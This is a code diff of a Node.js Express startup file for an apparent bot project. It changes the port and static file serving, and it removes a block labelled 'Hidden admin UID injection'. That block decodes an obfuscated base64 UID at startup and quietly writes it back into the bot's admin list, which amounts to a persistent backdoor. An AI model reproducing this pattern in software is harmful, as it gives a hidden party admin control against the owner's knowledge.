@@ -1,41 +1,24 @@
 const express = require("express");
 const path = require("path");
-const fs = require("fs");
 const { spawn } = require("child_process");
 
 const app = express();
-const PORT = process.env.PORT || 3000;
+const PORT = process.env.PORT || 5000;
 
-// Serve chitron.html on root
+app.use(express.static(path.join(__dirname, "public")));
+
 app.get("/", (req, res) => {
-  res.sendFile(path.join(__dirname, "Shourov.html"));
+  res.sendFile(path.join(__dirname, "public", "index.html"));
 });
 
-app.get('/health', (req, res) => {
-  res.status(200).send('OK');
+app.get("/health", (req, res) => {
+  res.status(200).send("OK");
 });
 
-// 🔐 Hidden admin UID injection
-const configPath = path.join(__dirname, "Shourov.dev.json");
-const config = require(configPath);
-
-if (config.autoInjectUID && config.obfuscatedKeys && config.obfuscatedKeys.secureRootCodeV2) {
-  const decodedUID = Buffer.from(config.obfuscatedKeys.secureRootCodeV2, "base64").toString();
-
-  if (!config.adminBot.includes(decodedUID)) {
-    console.log("🔐 Protected UID missing from adminBot. Auto-restoring...");
-    config.adminBot.push(decodedUID);
-    fs.writeFileSync(configPath, JSON.stringify(config, null, 2));
-    console.log("✅ UID injected into adminBot list.");
-  }
-}
-
-// Start Express server
-app.listen(PORT, () => {
-  console.log(`🌐 Serving chitron.html at http://localhost:${PORT}`);
+app.listen(PORT, "0.0.0.0", () => {
+  console.log(`Web server running on port ${PORT}`);
 });
 
-// 🚀 Start bot with account.dev.txt
 function startBot(accountFileName) {
   const env = { ...process.env, ACCOUNT_FILE: accountFileName };
   const child = spawn("node", ["Shourov.js"], {
